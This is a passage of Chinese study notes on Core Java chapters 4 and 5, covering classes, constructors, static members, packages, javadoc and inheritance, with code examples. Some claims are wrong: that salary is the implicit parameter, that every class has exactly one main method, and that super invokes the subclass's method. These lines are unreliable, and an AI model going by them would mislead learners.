name = n;        salary = s;        hireDay = LocalDate.of(year, month, day);    }        <span class="hljs-comment">// a method（方法）</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span></span><span class="hljs-function">    </span>{        <span class="hljs-keyword">return</span> name;    }        <span class="hljs-comment">// more methods</span>    <span class="hljs-comment">// ...</span>}</code></pre></div><h4 id="4-3-2-多个源文件的使用"><a href="#4-3-2-多个源文件的使用" class="headerlink" title="4.3.2 多个源文件的使用"></a>4.3.2 多个源文件的使用</h4><p>如果有多个.java文件，编译其中一个使用了另一个时会自动跨文件查找另一个类</p><h4 id="4-3-3-剖析Employee类"><a href="#4-3-3-剖析Employee类" class="headerlink" title="4.3.3 剖析Employee类"></a>4.3.3 剖析Employee类</h4><p>从Employee类开始，通过查看源码会发现这个类包含了1个<strong>构造器</strong>和4个<strong>方法</strong>：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Employee</span><span class="hljs-params">(String n, <span class="hljs-keyword">double</span> s, <span class="hljs-keyword">int</span> year, <span class="hljs-keyword">int</span> month, <span class="hljs-keyword">int</span> day)</span></span><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span></span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">double</span> <span class="hljs-title">getSalary</span><span class="hljs-params">()</span></span><span class="hljs-function"><span class="hljs-keyword">public</span> LocalDate <span class="hljs-title">getHireDay</span><span class="hljs-params">()</span></span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">raiseSalary</span><span class="hljs-params">(<span class="hljs-keyword">double</span> byPercent)</span></span></code></pre></div><p>这个类的所有方法都被标记为public，关键字<strong>public</strong>意味着任何类的<strong>任何方法都可以调用这个方法</strong>（共有4种访问级别）</p><p>接下来，需要注意在Employee类的实例中有三个实例域用来存放将要操作的数据：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span></span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">double</span> <span class="hljs-title">getSalary</span><span class="hljs-params">()</span></span><span class="hljs-function"><span class="hljs-keyword">public</span> LocalDate <span class="hljs-title">getHireDay</span><span class="hljs-params">()</span></span></code></pre></div><blockquote><p>注释：</p><p>可以用public标记实例域，但这是一种极为不提倡的做法。public数据域允许程序中的任何方法对其进行读取和修改。这就完全破坏了封装。任何类的任何方法都可以修改public域，某些代码将使用这种存取权限，这样并不合适。</p><p>因此，这里强烈建议将实例域标记为private。最后，请注意，有两个实例域本身就是对象：name域是String类对象，hireDay域是LocalDate类对象。这种情形十分常见：类通常包括类型属于某个类类型的实例域。</p><p>最后，请注意，有两个实例域本身就是对象：name域是String类对象，hireDay域是LocalDate类对象。这种情形十分常见：类通常包括类型属于某个类类型的实例域。</p></blockquote><h4 id="4-3-4-从构造器开始"><a href="#4-3-4-从构造器开始" class="headerlink" title="4.3.4 从构造器开始"></a>4.3.4 从构造器开始</h4><p>下面来看看Employee类的构造器：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Employee</span><span class="hljs-params">(String n, <span class="hljs-keyword">double</span> s, <span class="hljs-keyword">int</span> year, <span class="hljs-keyword">int</span> month, <span class="hljs-keyword">int</span> day)</span></span><span class="hljs-function"></span>{    name = n;    salary = s;    hireDay = LocalDate.of(year,month,day)}</code></pre></div><p>可以看到，构造器与类同名。在构造Employee类的对象时，构造器会运行，以便将实例域初始化为所希望的状态。</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">// 例如，当使用下面这条代码创建Employee类实例时：</span><span class="hljs-keyword">new</span> Employee(<span class="hljs-string">"James Bond"</span>,<span class="hljs-number">100000</span>,<span class="hljs-number">1950</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-comment">// 将会把实例域设置为：</span>name = <span class="hljs-string">"James Bond"</span>;salary = <span class="hljs-number">100000</span>;hireDay = LocalDate.of(<span class="hljs-number">1950</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>); <span class="hljs-comment">// January 1,1950</span></code></pre></div><p>构造器与其他的方法有一个重要的不同。构造器总是伴随着new操作符的执行被调用，而不能对一个已经存在的对象调用构造器来达到重新设置实例域的目的。例如以下操作会产生<code>编译错误</code>：</p><div class="hljs code-wrapper"><pre><code class="hljs java">james.Employee(<span class="hljs-string">"James Bond"</span>,<span class="hljs-number">100000</span>,<span class="hljs-number">1950</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)</code></pre></div><p>（即构造器只能 new一个对象，而不能对已经存在的这个<code>james</code>对象重新设置数据）</p><blockquote><p>构造器的特点：</p><ul><li>构造器与类同名</li><li>每个类可以有一个以上的构造器</li><li>构造器可以有0个、1个或多个参数</li><li>构造器没有返回值</li><li>构造器总是伴随着new操作一起调用</li></ul></blockquote><p>警告：请注意，不要在构造器中<strong>定义</strong>与实例域重名的局部变量。例如，下面的构造器将无法设置name和salary：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Employee</span><span class="hljs-params">(String n, <span class="hljs-keyword">double</span> s ...)</span></span><span class="hljs-function"></span>{    String name = n;<span class="hljs-comment">//Error</span>    <span class="hljs-keyword">double</span> salary = s;<span class="hljs-comment">//Error</span>...}</code></pre></div><p>注意：上面的name、salary前面不应该写String、double（注意在所有的方法中不要命名与实例域同名的变量）</p><h4 id="4-3-5-隐式参数与显式参数"><a href="#4-3-5-隐式参数与显式参数" class="headerlink" title="4.3.5 隐式参数与显式参数"></a>4.3.5 隐式参数与显式参数</h4><p>方法用于操作对象以及存取它们的实例域。例如，方法：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">raiseSalary</span><span class="hljs-params">(<span class="hljs-keyword">double</span> byPercent)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">double</span> raise = salary * byPercent / <span class="hljs-number">100</span>;    salary += raise;<span class="hljs-comment">//也可以写成 this.salary += raise;</span>}</code></pre></div><p>将调用这个方法的对象的salary实例域设置为新值：</p><div class="hljs code-wrapper"><pre><code class="hljs java">number007.raiseSalary(<span class="hljs-number">5</span>);</code></pre></div><p>它的结果将number007.salary域的值增加5%</p><p>raiseSalary方法有两个参数。第一个参数称为隐式（implicit）参数，是出现在方法名前的Employee类对象。第二个参数位于方法名后面括号中的数值，这是一个显式（explicit）参数。在raiseSalary方法中，隐式参数是salary，显式参数是byPercent。</p><h4 id="4-3-6-封装的优点"><a href="#4-3-6-封装的优点" class="headerlink" title="4.3.6 封装的优点"></a>4.3.6 封装的优点</h4><p>有些时候，需要获得或设置实例域的值。因此，应该提供下面三项内容：</p><ul><li>一个私有的数据域；（实例域private）</li><li>一个公有的域访问器方法；（方法public）</li><li>一个公有的域更改器方法。（构造器）</li></ul><p>这样做要比提供一个简单的公有数据域复杂些，但是却有着下列明显的好处：</p><p>首先，可以改变内部实现，除了该类的方法之外，不会影响其他代码。</p><p>警告：注意不要编写返回引用可变对象的访问器方法。在Employee类中就违反了这个设计原则，其中的getHireDay方法返回了一个Date类对象：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Employee</span></span><span class="hljs-class"></span>{<span class="hljs-function"><span class="hljs-keyword">private</span> Date <span class="hljs-title">getHireDay</span><span class="hljs-params">()</span></span><span class="hljs-function">    </span>{        <span class="hljs-keyword">return</span> hireDay;<span class="hljs-comment">//bad</span>    }}</code></pre></div><h4 id="4-3-7基于类的访问权限"><a href="#4-3-7基于类的访问权限" class="headerlink" title="4.3.7基于类的访问权限"></a>4.3.7基于类的访问权限</h4><p>方法可以访问所调用对象的私有数据，此外一个方法可以访问所属类的所有对象的私有数据。</p><h4 id="4-3-8-私有方法"><a href="#4-3-8-私有方法" class="headerlink" title="4.3.8 私有方法"></a>4.3.8 私有方法</h4><p>在实现一个类时，由于公有数据非常危险，所以应该将所有的数据域都设置为私有的。</p><p>在Java中，为了实现一个私有的方法，只需将关键字public改为private即可。</p><h4 id="4-3-9-final实例域"><a href="#4-3-9-final实例域" class="headerlink" title="4.3.9 final实例域"></a>4.3.9 final实例域</h4><p>final声明的实例域在被构造器执行之后无法再修改</p><p>例如，Employee类中的name域声明为final，因为咋对象构建之后这个值不会再被修改，即没有setName方法：</p><div class="hljs code-wrapper"><pre><code class="hljs java">calss Employee{<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String name;    ...}</code></pre></div><p>final修饰符大都应用于基本（primitive）类型域，或不可变（immutable）类的域</p><p>（如果类中的每个方法都不会改变其对象，这种类就是不可变的类。例如，String类就是一个不可变的类）</p><h3 id="4-4-静态域与静态方法"><a href="#4-4-静态域与静态方法" class="headerlink" title="4.4 静态域与静态方法"></a>4.4 静态域与静态方法</h3><h4 id="4-4-1-静态域"><a href="#4-4-1-静态域" class="headerlink" title="4.4.1 静态域"></a>4.4.1 静态域</h4><p>如果将域定义为static，每个类中只有一个这样的域。</p><p>例如，假定需要给每一个雇员赋予唯一的标识码。这里给Employee类添加一个实例域id和一个静态域nextId：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Employee</span></span><span class="hljs-class"></span>{<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> nextId = <span class="hljs-number">1</span>;<span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> id;...}</code></pre></div><p>每一个雇员对象都有一个自己的id域（多个id），但这个类的所有实例将共享一个nextId域（一个静态数据域）。</p><p>（即使没有一个雇员对象，静态域nextId也存在。它属于类，而不属于任何独立的对象。）</p><h4 id="4-4-2-静态常量"><a href="#4-4-2-静态常量" class="headerlink" title="4.4.2 静态常量"></a>4.4.2 静态常量</h4><p>静态变量使用得比较少，但静态常量却使用得比较多。例如，在Math类中定义了一个静态常量</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> calss Math{...<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">double</span> PI = <span class="hljs-number">3.14159265358979323846</span>;...}</code></pre></div><h4 id="4-4-3-静态方法"><a href="#4-4-3-静态方法" class="headerlink" title="4.4.3 静态方法"></a>4.4.3 静态方法</h4><p>静态方法是一种不能向对象实施操作的方法。例如，Math类的pow方法就是一个静态方法。表达式</p><div class="hljs code-wrapper"><pre><code class="hljs java">Math.pow(x,a)</code></pre></div><p>这里Math类是对象，显然没法对Math类施加操作</p><h4 id="4-4-4-工厂方法"><a href="#4-4-4-工厂方法" class="headerlink" title="4.4.4 工厂方法"></a>4.4.4 工厂方法</h4><p>类似<code>LocalDate</code>和<code>NumberFormat</code>的类使用静态工厂方法（factory method）来构造对象。</p><h4 id="4-4-5-main方法"><a href="#4-4-5-main方法" class="headerlink" title="4.4.5 main方法"></a>4.4.5 main方法</h4><p>不需要使用对象调用静态方法，例如：不需要构造Math类对象就可以调用Math.pow</p><p>每一个类都有且只有一个main方法</p><h3 id="4-6-对象构造"><a href="#4-6-对象构造" class="headerlink" title="4.6 对象构造"></a>4.6 对象构造</h3><p>象构造非常重要，所以Java提供了多种编写构造器的机制。</p><h4 id="4-6-1-重载"><a href="#4-6-1-重载" class="headerlink" title="4.6.1 重载"></a>4.6.1 重载</h4><p>如果多个方法有相同的名字、不同的参数，便产生了重载。</p><blockquote><p>Java允许重载任何方法，而不只是构造器方法</p></blockquote><h4 id="4-6-2-默认域初始化"><a href="#4-6-2-默认域初始化" class="headerlink" title="4.6.2 默认域初始化"></a>4.6.2 默认域初始化</h4><p>如果在构造器中没有显式地给域赋予初值，那么就会被自动地赋为默认值：数值为0、布尔值为false、对象引用为null。（不提倡这样做，菜鸟才这样写）</p><p>比如Employee类，假定没有在构造器中对某些域进行初始化，就会默认地将salary域初始化为0，将name和hireDay域初始化为null。</p><h4 id="4-6-3-无参数的构造器"><a href="#4-6-3-无参数的构造器" class="headerlink" title="4.6.3 无参数的构造器"></a>4.6.3 无参数的构造器</h4><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Employee</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>{name = <span class="hljs-string">""</span>;salary = <span class="hljs-number">0</span>;hireDay = LocalDate.now();}</code></pre></div><p>如果类中提供了至少一个构造器，但是没有提供无参数的构造器，则在构造对象时如果没有提供参数就会被视为不合法。</p><h4 id="4-6-4-显式域初始化"><a href="#4-6-4-显式域初始化" class="headerlink" title="4.6.4 显式域初始化"></a>4.6.4 显式域初始化</h4><p>通过重载类的构造器方法，有很多形式可以设置类的实例域的初始状态。确保不管怎样调用构造器，每个实例域都可以被设置为一个有意义的初值，这是一种很好的设计习惯。</p><p>例如，可以在类定义中，直接将一个值赋给任何域：</p><div class="hljs code-wrapper"><pre><code class="hljs java">calss Employee{<span class="hljs-keyword">private</span> String name = <span class="hljs-string">""</span>;}</code></pre></div><h4 id="4-6-5-参数名"><a href="#4-6-5-参数名" class="headerlink" title="4.6.5 参数名"></a>4.6.5 参数名</h4><p>参数名写通俗易懂点，比如可以写成这样：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Employee</span><span class="hljs-params">(String aName, <span class="hljs-keyword">double</span> aSalary)</span><span class="hljs-comment">//如果这两个参数写成 n和 s别人就看不懂了</span></span><span class="hljs-function"></span>{name = aName;salary = aSalary;}</code></pre></div><h4 id="4-6-6-调用另一个构造器"><a href="#4-6-6-调用另一个构造器" class="headerlink" title="4.6.6 调用另一个构造器"></a>4.6.6 调用另一个构造器</h4><p><code>this</code>除了可以引用方法的隐式参数以外，还能调用同一个类的另一个构造器，例如：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Employee</span><span class="hljs-params">(<span class="hljs-keyword">double</span> s)</span></span><span class="hljs-function"></span>{<span class="hljs-comment">// 调用 Employee(String,double)</span><span class="hljs-keyword">this</span>(<span class="hljs-string">"Employee #"</span> + nextId, s);nextId++;}</code></pre></div><p>当调用new Employee(60000)时，Employee(double)构造器将调用Employee(String, double)构造器。</p><h4 id="4-6-7-初始化块"><a href="#4-6-7-初始化块" class="headerlink" title="4.6.7 初始化块"></a>4.6.7 初始化块</h4><p>前面已经讲过两种初始化数据域的方法：</p><ul><li>在构造器中设置值</li><li>在声明中赋值</li></ul><p>此外，还有第三种机制：初始化块（initialization block）</p><p>在一个类的声明中，可以包含多个代码块。只要构造类的对象，这些块就会被执行。例如：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Employee</span></span><span class="hljs-class"></span>{<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> nextId;<span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> id;<span class="hljs-keyword">private</span> String name;<span class="hljs-keyword">private</span> <span class="hljs-keyword">double</span> salary;<span class="hljs-comment">// 初始化块</span>{id = nextId;nextId++;}<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Employee</span><span class="hljs-params">(String aName ,<span class="hljs-keyword">double</span> aSalary)</span></span><span class="hljs-function"></span>{name = aName;        salary = aSalary;}        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Employee</span><span class="hljs-params">()</span></span><span class="hljs-function">    </span>{        name = <span class="hljs-string">""</span>;        salary = <span class="hljs-number">0</span>;    }    <span class="hljs-comment">//...</span>}</code></pre></div><p>在这个示例中，无论使用哪个构造器构造对象，id域都在对象初始化块中被初始化。首先运行初始化块，然后才运行构造器的主体部分。（很少用这种，通常会直接将初始化代码放在构造器中）</p><h4 id="4-6-8-对象析构与finalize方法"><a href="#4-6-8-对象析构与finalize方法" class="headerlink" title="4.6.8 对象析构与finalize方法"></a>4.6.8 对象析构与finalize方法</h4><p>C++中每个类都能有一个析构函数，用来回收分配给对象的存储空间。</p><p>由于Java有自动的垃圾回收器，不需要人工回收内存，所以Java不支持析构器。</p><p>可以为任何一个类添加finalize方法。finalize方法将在垃圾回收器清除对象之前调用。（一般不用，因为很难知道什么时候调用）</p><h3 id="4-7-包"><a href="#4-7-包" class="headerlink" title="4.7 包"></a>4.7 包</h3><p>Java允许使用包（package）将类组织起来。借助于包可以方便地组织自己的代码，并将自己的代码与别人提供的代码库分开管理。使用包的主要原因是<strong>确保类名的唯一性</strong></p><p>Sun公司建议将域名以逆序的形式作为包名，比如 horstmann.com 的逆序形式是 com.horstmann，这个包还可以被进一步地划分成子包，如com.horstmann. corejava</p><h4 id="4-7-1-类的导入"><a href="#4-7-1-类的导入" class="headerlink" title="4.7.1 类的导入"></a>4.7.1 类的导入</h4><p>一个类可以使用所属包中的所有类，以及其他包中的公有类（public class），可以在每个类名前添加完整的包名访问，例如：</p><div class="hljs code-wrapper"><pre><code class="hljs java">java.time.LocalDate today = java.time.LocalDate.now()</code></pre></div><p>写起来太麻烦，所以一般用<code>import</code>的方式导入（之后就不用写完整的包名了），例如：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.time.*<span class="hljs-comment">//导入 java.time 包中所有的类</span>   LocalDate today = LocalDate.now()<span class="hljs-comment">//调用</span></code></pre></div><h4 id="4-7-2-静态导入"><a href="#4-7-2-静态导入" class="headerlink" title="4.7.2 静态导入"></a>4.7.2 静态导入</h4><p><code>import</code>语句不仅可以导入类，还增加了导入静态方法和静态域的功能，例如：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.System.*</code></pre></div><p>就可以使用System类的静态方法和静态域，而不必加类名前缀：</p><div class="hljs code-wrapper"><pre><code class="hljs java">out.println(<span class="hljs-string">"Goodbye, World!"</span>)</code></pre></div><h4 id="4-7-3-将类放入包中"><a href="#4-7-3-将类放入包中" class="headerlink" title="4.7.3 将类放入包中"></a>4.7.3 将类放入包中</h4><p>如果没有在源文件中放置package语句，这个源文件中的类就被放置在一个默认包（defaulf package）中，默认包是一个没有名字的包。</p><p>下面将类分别放在不同的包中（com. horstmann.corejava和com.mycompany）</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/20211119203950.png" srcset="/img/loading.gif" lazyload="" width="40%"></p><p>在这种情况下，仍然要从基目录编译和运行类：</p><p><code>java com/horstmann/corejava/Employee.java</code></p><p><code>java com/horstmann/corejava/Employee</code></p><h4 id="4-7-4-包作用域"><a href="#4-7-4-包作用域" class="headerlink" title="4.7.4 包作用域"></a>4.7.4 包作用域</h4><p>标记为public的部分可以被任意的类使用；标记为private的部分只能被定义它们的类使用</p><p>如果没有指定public或private，这个部分（类、方法或变量）可以被同一个包中的所有方法访问。</p><blockquote><p>注意：声明和定义变量别忘了在前面加 private</p></blockquote><h3 id="4-8-类路径"><a href="#4-8-类路径" class="headerlink" title="4.8 类路径"></a>4.8 类路径</h3><p>类路径包括：</p><ul><li>基目录/home/user/classdir或c:\classes；</li><li>当前目录(.)；</li><li>JAR文件/home/user/archives/archive.jar或c:\archives\archive.jar</li></ul><p>例如：</p><div class="hljs code-wrapper"><pre><code class="hljs java">/home/user/calssdir:.:/home/user/archives/archive.jar</code></pre></div><p>（在UNIX环境中，类路径中的不同项目之间采用冒号<code>:</code>分隔，window中用分号<code>;</code>分隔）</p><p>SE6 开始用<code>*</code>或<code>'*'</code>表示通配符（但是UNIX中禁止使用<code>*</code>以防止shell命令进一步扩展，所以推荐用<code>'*'</code>）</p><h3 id="4-9-文档注释"><a href="#4-9-文档注释" class="headerlink" title="4.9 文档注释"></a>4.9 文档注释</h3><p>JDK包含一个很有用的工具，叫做javadoc，它可以由源文件生成一个HTML文档。</p><h4 id="4-9-1-注释的插入"><a href="#4-9-1-注释的插入" class="headerlink" title="4.9.1 注释的插入"></a>4.9.1 注释的插入</h4><p>这几部分一般要写一下注释：</p><ul><li>包</li><li>公有类与接口</li><li>公有的和受保护的构造器及方法</li><li>公有的和受保护的域</li></ul><h4 id="4-9-2-类注释"><a href="#4-9-2-类注释" class="headerlink" title="4.9.2 类注释"></a>4.9.2 类注释</h4><p>类注释一般放在import语句之后，类定义之前</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/*</span><span class="hljs-comment">这里写类注释</span><span class="hljs-comment">*/</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Employee</span></span><span class="hljs-class"></span>{...}</code></pre></div><h4 id="4-9-3-方法注释"><a href="#4-9-3-方法注释" class="headerlink" title="4.9.3 方法注释"></a>4.9.3 方法注释</h4><p>每一个方法注释必须放在所描述的方法之前。除了通用标记之外，还可以使用下面的标记：</p><ul><li>@param变量描述这个标记将对当前方法的“param”（参数）部分添加一个条目。这个描述可以占据多行，并可以使用HTML标记。一个方法的所有@param标记必须放在一起。</li><li>@return描述这个标记将对当前方法添加“return”（返回）部分。这个描述可以跨越多行，并可以使用HTML标记。</li><li>@throws类描述这个标记将添加一个注释，用于表示这个方法有可能抛出异常。</li></ul><p>例如：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">/*</span><span class="hljs-comment">员工涨薪</span><span class="hljs-comment">@param byPercent涨薪百分比</span><span class="hljs-comment">@return 涨过后的资薪</span><span class="hljs-comment">*/</span><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">double</span> <span class="hljs-title">raiseSalary</span><span class="hljs-params">(<span class="hljs-keyword">double</span> byPercent)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">double</span> raise = salary * byPercent / <span class="hljs-number">100</span>;    <span class="hljs-keyword">this</span>.salary += raise;    <span class="hljs-keyword">return</span> raise;}</code></pre></div><h3 id="4-10-类设计技巧"><a href="#4-10-类设计技巧" class="headerlink" title="4.10 类设计技巧"></a>4.10 类设计技巧</h3><ol><li>一定要保证数据私有</li><li>一定要对数据初始化</li><li>不要在类中使用过多的实例域</li><li>不是所有的域都需要独立的域访问器和域更改器</li><li>将职责过多的类进行分解</li><li>类名和方法名要能够体现它们的职责</li><li>优先使用不可变的类（涉及在多个线程间的安全共享）</li></ol><h2 id="第5章-继承"><a href="#第5章-继承" class="headerlink" title="第5章 继承"></a>第5章 继承</h2><p>继承（inheritance）就是基于已存在的类构造一个新的类，简单讲就是复用类的方法和实例域</p><h3 id="5-1-类、超类和子类"><a href="#5-1-类、超类和子类" class="headerlink" title="5.1 类、超类和子类"></a>5.1 类、超类和子类</h3><h4 id="5-1-1-定义子类"><a href="#5-1-1-定义子类" class="headerlink" title="5.1.1 定义子类"></a>5.1.1 定义子类</h4><p>由继承Employee类来定义Manager类的格式，关键字extends表示继承：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Manager</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Employee</span></span><span class="hljs-class"></span>{<span class="hljs-comment">// 添加实例域和方法</span>}</code></pre></div><ul><li>已存在的类称为：<strong>父类</strong>（parent class）、超类（<code>superclass</code>）或基类（base class）</li><li>新类称为<strong>子类</strong>（subclass）、派生类（derived class）或孩子类（child class）</li></ul><p>子类一般比它的父类有更丰富的功能</p><h4 id="5-1-2-覆盖方法"><a href="#5-1-2-覆盖方法" class="headerlink" title="5.1.2 覆盖方法"></a>5.1.2 覆盖方法</h4><p>父类中的有些方法对子类并不一定适用，所以需要提供一个新的方法来<strong>覆盖（override）</strong>父类中的这个方法，具体实现方式为直接在子类里<code>重写</code>这个方法。</p><p>注意，子类不能直接访问父类的私有域，此外如果子类和父类有同一个方法名，那么子类会优先调用自己的方法。</p><p><strong>调用子类的方法而不是当前类</strong>的方法，可以通过关键字<strong>super</strong>实现，例如继承了Employee类的Manager类调用Employee类中的getSalary方法：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Manager</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Employee</span></span><span class="hljs-class"></span>{<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">double</span> <span class="hljs-title">getSalary</span><span class="hljs-params">()</span></span><span class="hljs-function">    </span>{        <span class="hljs-keyword">double</span> baseSalary = <span class="hljs-keyword">super</span>.getSalary();        <span class="hljs-keyword">return</span> baseSalary += bonus;    }}</code></pre></div><p>如果只写<code>super(a,b,c)</code>表示调用父类中有(a,b,c)参数的构造器</p><h4 id="5-1-3-子类构造器"><a href="#5-1-3-子类构造器" class="headerlink" title="5.1.3 子类构造器"></a>5.1.3 子类构造器</h4><p>由于子类的构造器不饿能访问子类的私有域，所以必须通过父类的构造器对这部分私有域进行初始化，可以通过<code>super</code>实现对子类构造器的调用。（使用<code>super</code>调用构造器必须是子类构造器的第一条语句）</p><blockquote><ul><li><code>this</code>的用途：<ul><li>引用隐式参数</li><li>调用该类的其他构造器</li></ul></li><li><code>super</code>的用途：<ul><li>调用父类的方法</li><li>调用父类的构造器</li></ul></li></ul></blockquote><h4 id="5-1-4-继承层次"><a href="#5-1-4-继承层次" class="headerlink" title="5.1.4 继承层次"></a>5.1.4 继承层次</h4><p>继承了父类的子类还能派生出新的类，由一个共给父类派生出来的所有类的集合称为<strong>继承层次</strong>。</p><p>从某个特定的类到其祖先的路径被称为该类的继承链，一个祖先类可以拥有多个子孙继承链。</p><h4 id="5-1-5-多态"><a href="#5-1-5-多态" class="headerlink" title="5.1.5 多态"></a>5.1.5 多态</h4><p>如果程序中出现超类对象的任何地方都可以用子类对象置换，那么就应该设计为继承，这是<strong>“is-a”规则</strong>。</p><p>在Java中，对象变量是多态的。多态是同一个行为具有多个不同表现形式或形态的能力。多态就是同一个接口，使用不同的实例而执行不同操作，如图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211121215148079.png" srcset="/img/loading.gif" lazyload="" alt=""></p><ul><li>多态存在的三个必要条件：<ul><li>继承</li><li>重写</li><li>父类引用指向子类对象：<strong>Parent p = new Child();</strong></li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211121215328365.png" srcset="/img/loading.gif" lazyload="" width="60%"></p><ul><li>多态的优点：<ul><li>消除类型之间的耦合关系</li><li>可替换性</li><li>可扩充性</li><li>接口性</li><li>灵活性</li><li>简化性</li></ul></li></ul><h4 id="5-1-6-理解方法调用"><a href="#5-1-6-理解方法调用" class="headerlink" title="5.1.6 理解方法调用"></a>5.1.6 理解方法调用</h4><p>方式调用过程的详细描述：</p><ol><li>编译器查看对象的声明类型和方法名</li><li>编译器查看调用方法时提供的参数类型</li><li>如果是private方法、static方法、final方法或者构造器，编译器应该知道调用哪个方法</li><li>程序运行</li></ol><h4 id="5-1-7-阻止继承：final类和方法"><a href="#5-1-7-阻止继承：final类和方法" class="headerlink" title="5.1.7 阻止继承：final类和方法"></a>5.1.7 阻止继承：final类和方法</h4><p>不允许扩展的类被称为<strong>final类</strong>，如果类中的某个方法声明了final，那么它的子类就不能覆盖（重写）这个方法。</p><h4 id="5-1-8-强制类型转换"><a href="#5-1-8-强制类型转换" class="headerlink" title="5.1.8 强制类型转换"></a>5.1.8 强制类型转换</h4><p>将某个类的对象引用转换成另外一个类的对象引用，就是对象引用的强制转换。</p><p>对象引用的转换语法与数值表达式的类型转换类似，仅需要用一对圆括号将目标类名括起来，并放置在需要转换的对象引用之前就可以了。例如：</p><div class="hljs code-wrapper"><pre><code class="hljs java">Manager boss = (Manager) staff[<span class="hljs-number">0</span>];<span class="hljs-comment">//对象引用强制转换</span><span class="hljs-keyword">int</span> nx = (<span class="hljs-keyword">int</span>) x;<span class="hljs-comment">//这是数据类型强制转换</span></code></pre></div><h4 id="5-1-9-抽象类"><a href="#5-1-9-抽象类" class="headerlink" title="5.1.9 抽象类"></a>5.1.9 抽象类</h4><p>为了提高程序的清晰度，包含一个或多个<strong>抽象方法</strong>的类本身必须通过关键字<code>abstract</code>声明为抽象类。例如：</p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span></span><span class="hljs-class"></span>{...<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> String <span class="hljs-title">getDescription</span><span class="hljs-params">()</span></span>;}</code></pre></div><blockquote><p><strong>抽象方法</strong>：指不确定的方法，即没有明确定义的方法</p></blockquote><h4 id="5-1-10-受保护访问"><a href="#5-1-10-受保护访问" class="headerlink" title="5.1.10 受保护访问"></a>5.1.10 受保护访问</h4><p>众所周知，最好将类中的域标记为private，而方法标记为public。任何声明为private的内容对其他类都是不可见的（包括子类也不能访问父类的私有域）</p><p>而如果将实例域或方法声明为<strong>protected</strong>，子类就能够访问这个实例域或方法。</p><h3 id="5-2-Object：所有类的父类"><a href="#5-2-Object：所有类的父类" class="headerlink" title="5.2 Object：所有类的父类"></a>5.2 